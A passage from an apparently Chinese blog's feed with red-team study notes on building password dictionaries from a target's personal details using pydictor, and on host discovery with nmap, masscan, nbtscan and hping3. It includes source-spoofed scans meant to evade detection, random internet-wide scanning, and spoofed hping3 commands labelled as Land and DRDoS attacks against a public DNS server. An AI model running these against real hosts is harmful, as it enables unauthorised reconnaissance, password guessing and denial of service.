        <content type="html"><![CDATA[<p>本章节内容主要是介绍利用已经收集的个人信息来生成字典。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="关联信息生成"><a href="#关联信息生成" class="headerlink" title="关联信息生成"></a>关联信息生成</h2><p>在渗透前期工作开展之前，需要对目标的各种信息进行分析、拆分、组合。</p><p>例如：赫尔巴斯亚基国</p><p>根据地域习惯、宗教、互联网开发信息等信息进行简要拆分，假设获取的信息如下：</p><ul><li>当地人爱好吃橙子</li><li>当地人信奉伊斯兰教</li><li>IPV4地址开放IP段</li><li>相关社交网络公开的数据库</li></ul><p>根据宗教、习惯、IP地址、开放数据支持……等，为后续的字典生成、鱼叉、水坑攻击铺下基石。</p><h2 id="字典生成"><a href="#字典生成" class="headerlink" title="字典生成"></a>字典生成</h2><h3 id="pydictor"><a href="#pydictor" class="headerlink" title="pydictor"></a>pydictor</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone https://github.com/LandGrey/pydictor.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="生成字典"><a href="#生成字典" class="headerlink" title="生成字典"></a>生成字典</h4><p><img src="https://img1.imgtp.com/2022/03/25/Xb0E9vMT.png"></p><p>快速使用：<a href="https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md">https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md</a></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token variable">$python3</span> pydictor.py --sedb                              _ _      _              _ __  _   _  __<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> ___<span class="token operator">|</span> <span class="token operator">|</span>_ ___  _ __             <span class="token operator">|</span> <span class="token string">'_ \| | | |/ _` | |/ __| __/ _ \| '</span>__<span class="token operator">|</span>             <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>             <span class="token operator">|</span> .__/ <span class="token punctuation">\</span>__, <span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__<span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span>             <span class="token operator">|</span>_<span class="token operator">|</span>    <span class="token operator">|</span>___/                                            Social Engineering Dictionary Builder                                            Build by LandGrey    ----------------------------<span class="token punctuation">[</span> <span class="token builtin class-name">command</span> <span class="token punctuation">]</span>----------------------------    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>help desc             <span class="token punctuation">[</span>+<span class="token punctuation">]</span>exit/quit            <span class="token punctuation">[</span>+<span class="token punctuation">]</span>clear/cls    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>show option           <span class="token punctuation">[</span>+<span class="token punctuation">]</span>set option arguments <span class="token punctuation">[</span>+<span class="token punctuation">]</span>rm option    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>len minlen maxlen     <span class="token punctuation">[</span>+<span class="token punctuation">]</span>head prefix          <span class="token punctuation">[</span>+<span class="token punctuation">]</span>tail suffix    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>encode <span class="token builtin class-name">type</span>           <span class="token punctuation">[</span>+<span class="token punctuation">]</span>occur L d s          <span class="token punctuation">[</span>+<span class="token punctuation">]</span>types L d s    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>regex string          <span class="token punctuation">[</span>+<span class="token punctuation">]</span>level code           <span class="token punctuation">[</span>+<span class="token punctuation">]</span>leet code    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>output directory      <span class="token punctuation">[</span>+<span class="token punctuation">]</span>run    ----------------------------<span class="token punctuation">[</span> option <span class="token punctuation">]</span>----------------------------    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>cname                 <span class="token punctuation">[</span>+<span class="token punctuation">]</span>ename                <span class="token punctuation">[</span>+<span class="token punctuation">]</span>sname    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>birth                 <span class="token punctuation">[</span>+<span class="token punctuation">]</span>usedpwd              <span class="token punctuation">[</span>+<span class="token punctuation">]</span>phone    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>uphone                <span class="token punctuation">[</span>+<span class="token punctuation">]</span>hphone               <span class="token punctuation">[</span>+<span class="token punctuation">]</span>email    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>postcode              <span class="token punctuation">[</span>+<span class="token punctuation">]</span>nickname             <span class="token punctuation">[</span>+<span class="token punctuation">]</span>idcard    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>jobnum                <span class="token punctuation">[</span>+<span class="token punctuation">]</span>otherdate            <span class="token punctuation">[</span>+<span class="token punctuation">]</span>usedcharpydictor SEDB<span class="token operator">>></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>新版pydictor生成字典时存在问题，需要下载旧版pydictor</p><p>wget <a href="https://github.com/LandGrey/pydictor/archive/refs/tags/v2.0.5.zip">https://github.com/LandGrey/pydictor/archive/refs/tags/v2.0.5.zip</a></p></blockquote><h4 id="合并去重"><a href="#合并去重" class="headerlink" title="合并去重"></a>合并去重</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python pydictor.py -tool unqbiner /my/all/dict/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>只需要指定路径</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/tools/pydictor-2.0.5<span class="token punctuation">]</span>└─$ python3 pydictor.py -tool uniqbiner ~/tools/pydictor-2.0.5/results/                              _ _      _              _ __  _   _  __<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> ___<span class="token operator">|</span> <span class="token operator">|</span>_ ___  _ __                                               <span class="token operator">|</span> <span class="token string">'_ \| | | |/ _` | |/ __| __/ _ \| '</span>__<span class="token operator">|</span>                                              <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>                                                 <span class="token operator">|</span> .__/ <span class="token punctuation">\</span>__, <span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__<span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span>                                                 <span class="token operator">|</span>_<span class="token operator">|</span>    <span class="token operator">|</span>___/                            <span class="token number">2.0</span>.5<span class="token comment">#dev                        </span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Source of  :7869 lines<span class="token punctuation">[</span>+<span class="token punctuation">]</span> A total of :7869 lines<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Store <span class="token keyword">in</span>   :/home/kali/tools/pydictor-2.0.5/results/uniqbiner_034233.txt <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cost       :0.2306 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主机发现</title>
      <link href="/2022/03/24/zhu-ji-fa-xian/"/>
      <url>/2022/03/24/zhu-ji-fa-xian/</url>
      
        <content type="html"><![CDATA[<p>开一个新坑，将市面上现在流传的 redteam 系列书籍进行一个学习记录，文章内容主要摘自某红队系列丛书。</p><p>本章节内容主要是介绍常见的主机扫描和服务扫描工具。</p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><h3 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h3><p><a href="https://nmap.org/">https://nmap.org/</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Mac os：brew <span class="token function">install</span> nmapCentos：yum <span class="token function">install</span> nmapUbuntu：apt <span class="token function">install</span> nmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="参考手册"><a href="#参考手册" class="headerlink" title="参考手册"></a>参考手册</h3><p><a href="https://nmap.org/man/zh/index.html">https://nmap.org/man/zh/index.html</a></p><h3 id="扫描方式"><a href="#扫描方式" class="headerlink" title="扫描方式"></a>扫描方式</h3><ul><li>TCP：-sT</li><li>SYN：-sS</li><li>ACK：-sA</li><li>UDP：-sU</li><li>RPC：-sR</li><li>ICMP：-sP</li><li>Disable Port Scan：-sn</li></ul><h3 id="常用的扫描方法"><a href="#常用的扫描方法" class="headerlink" title="常用的扫描方法"></a>常用的扫描方法</h3><ul><li>扫描10000端口、操作系统、版本</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -T4 -A <span class="token operator">&lt;</span>target<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>版本探测</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sV <span class="token operator">&lt;</span>target<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>操作系统探测</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -O <span class="token operator">&lt;</span>target<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h3><ul><li>–host-timeout 主机超时 通常选值：18000</li><li>–scan-delay 报文时间间隔 通常选值：1000</li><li>-S &lt;源地址&gt; 定义扫描源地址，为了不被发现</li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>nmap -v -iR 100000 -P0 -p 80</p><p><code>随机选择100000台主机扫描是否运行Web服务器（80端口）。由起始阶段发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因此使用 -P0 禁止对主机列表。（-P0 就是 -Pn）</code></p><p>host company.com | cut -d ‘ ‘ -f 4 | nmap -v -iL -（host -l company.com | cut -d ‘ ‘ -f 4 | nmap -v -iL -）</p><p><code>进行DNS区域传输，已发现company.com中的主机，然后将IP地址提供给nmap</code></p><blockquote><p>host -l &lt;domain&gt; 需要有域系统的<strong>管理员权限</strong>，才可以列出所有子域名，一般情况下无法使用<br>cut -d ‘ ‘ -f 4 将输出终端的字符进行分割，-d 指定分割字符，指定分割位置<br>nmap -v -iL - 解析出来 ip 传给 nmap 扫描，-v 显示详细信息，-iL 指定传入的文件名</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><ul><li><p>-oN <File></p></li><li><p>-oX <XML File></p></li><li><p>-oG <filespec></p><p>Grep输出 参考：<a href="http://www.unspecific.com/nmap-oG-output">http://www.unspecific.com/nmap-oG-output</a></p></li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> nmap -O -oG - www.baidu.com  Nmap <span class="token number">7.92</span> scan initiated Thu Mar <span class="token number">24</span> 06:16:08 <span class="token number">2022</span> as: nmap -O -oG - www.baidu.comHost: <span class="token number">110.242</span>.68.3 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.3 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Ports: <span class="token number">80</span>/open/tcp//http///, <span class="token number">443</span>/open/tcp//https///     Ignored State: filtered <span class="token punctuation">(</span><span class="token number">998</span><span class="token punctuation">)</span>Seq Index: <span class="token number">256</span>   IP ID Seq: RandomizedNmap <span class="token keyword">done</span> at Thu Mar <span class="token number">24</span> 06:16:21 <span class="token number">2022</span> -- <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">12.63</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> nmap www.baidu.com -oG - <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'/open/&#123;print $2&#125;'</span><span class="token number">110.242</span>.68.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>awk ‘/open/{print $2}’ 正则匹配含 open 的行，以空格为分割取第二列</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> nmap <span class="token number">110.242</span>.68.4/29 -oG - -sPNmap <span class="token number">7.92</span> scan initiated Thu Mar <span class="token number">24</span> 06:28:33 <span class="token number">2022</span> as: nmap -oG - -sP <span class="token number">110.242</span>.68.4/29Host: <span class="token number">110.242</span>.68.1 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.2 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.3 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.4 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.5 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.6 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.7 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpNmap <span class="token keyword">done</span> at Thu Mar <span class="token number">24</span> 06:28:47 <span class="token number">2022</span> -- <span class="token number">8</span> IP addresses <span class="token punctuation">(</span><span class="token number">7</span> hosts up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">14.25</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h2><h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h3><p><a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> --assume-yes <span class="token function">install</span> <span class="token function">git</span> <span class="token function">make</span> gcc<span class="token function">git</span> clone https://github.com/robertdavidgraham/masscan<span class="token builtin class-name">cd</span> masscan<span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>该工具兼容Nmap的参数</p></blockquote><p>现在可以直接apt安装</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">apt</span> <span class="token function">install</span> masscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="高级选项"><a href="#高级选项" class="headerlink" title="高级选项"></a>高级选项</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> masscan <span class="token number">121.37</span>.71.222 --port <span class="token number">3389</span> --adapter-ip <span class="token number">192.168</span>.186.26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img1.imgtp.com/2022/03/24/RmpdiIk8.png"></p><ul><li>–adapter-ip 指定发包的IP地址</li><li>–adapter-port 指定发包的源端口</li><li>–adapter-mac 指定发包的源MAC地址</li><li>–router-mac 指定网关的MAC地址</li><li>–exclude IP地址范围黑名单，防止masscan扫描</li><li>–includefile，-iL 读取一个范围列表进行扫描</li><li>–wait 指定网发送包后的等待时间，默认为10秒</li></ul><h2 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h2><p>kali中已经安装：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ <span class="token function">whereis</span> nbtscannbtscan: /usr/bin/nbtscan /usr/share/man/man1/nbtscan.1.gz                                                                                                              ┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ nbtscanNBTscan version <span class="token number">1.7</span>.1.This is a <span class="token function">free</span> software and it comes with absolutely no warranty.You can use, distribute and modify it under terms of GNU GPL <span class="token number">2</span>+.Usage:nbtscan <span class="token punctuation">[</span>-v<span class="token punctuation">]</span> <span class="token punctuation">[</span>-d<span class="token punctuation">]</span> <span class="token punctuation">[</span>-e<span class="token punctuation">]</span> <span class="token punctuation">[</span>-l<span class="token punctuation">]</span> <span class="token punctuation">[</span>-t timeout<span class="token punctuation">]</span> <span class="token punctuation">[</span>-b bandwidth<span class="token punctuation">]</span> <span class="token punctuation">[</span>-r<span class="token punctuation">]</span> <span class="token punctuation">[</span>-q<span class="token punctuation">]</span> <span class="token punctuation">[</span>-s separator<span class="token punctuation">]</span> <span class="token punctuation">[</span>-m retransmits<span class="token punctuation">]</span> <span class="token punctuation">(</span>-f filename<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>scan_range<span class="token operator">></span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="nbtscan示例"><a href="#nbtscan示例" class="headerlink" title="nbtscan示例"></a>nbtscan示例</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nbtscan -r <span class="token number">192.168</span>.0.1/24扫描整个C段nbtscan <span class="token number">192.168</span>.0.1-100扫描一个范围nbtscan -v -s <span class="token builtin class-name">:</span> <span class="token number">192.168</span>.0.0/24以 <span class="token builtin class-name">:</span> 分割显示结果nbtscan -f <span class="token operator">&lt;</span>File<span class="token operator">></span>从文件读取扫描范围<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ nbtscan -v -s <span class="token string">' '</span> <span class="token number">192.168</span>.0.112 <span class="token number">192.168</span>.0.112 DESKTOP-R5A39I1 00U<span class="token number">192.168</span>.0.112 DESKTOP-R5A39I1 20U<span class="token number">192.168</span>.0.112 WORKGROUP       00G<span class="token number">192.168</span>.0.112 MAC <span class="token number">18</span>:26:49:4c:f8:4c                                                                                                              ┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ nbtscan -v -s <span class="token string">' '</span> <span class="token number">192.168</span>.0.112 <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span> <span class="token operator">|</span> <span class="token function">uniq</span><span class="token number">192.168</span>.0.112<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>awk ‘{print $1}’取第一列</p><p>uniq 筛选出重复字符串</p></blockquote><h2 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h2><p>hping3主要是测试防火墙的拦截规则，对网络设备进行测试</p><p><img src="https://img1.imgtp.com/2022/03/24/pC7lL5tA.png"></p><h3 id="常用模式"><a href="#常用模式" class="headerlink" title="常用模式"></a>常用模式</h3><ul><li>-0 –rawip IP原始报文</li><li>-1 –icmp ICMP模式</li><li>-2 –udp UDP模式</li><li>-8 –scan 扫描模式</li><li>-9 –listen 监听模式</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> hping3 --scan <span class="token number">1</span>-30,70-90 -S www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>SYN方式扫描主机端口</p></blockquote><p><img src="https://img1.imgtp.com/2022/03/24/vC16eD9o.png"></p><p>可以看到，目标主机回复：S..A，代表SYN/ACK</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> hping3 -S -a <span class="token number">114.114</span>.114.114 -p <span class="token number">53</span> <span class="token number">114.114</span>.114.114 -c <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>测试防火墙对ICMP包的反应，是否支持traceroute，是否开放某个端口，对防火墙进行拒绝服务攻击（Dos attack）。例如，以Land Attack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立链接）。</p></blockquote><h3 id="DRDDOS"><a href="#DRDDOS" class="headerlink" title="DRDDOS"></a>DRDDOS</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> hping3 --udp -a <span class="token number">114.114</span>.114.114 -p <span class="token number">53</span> <span class="token number">114.114</span>.114.114 -c <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>基于UDP的DOS</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
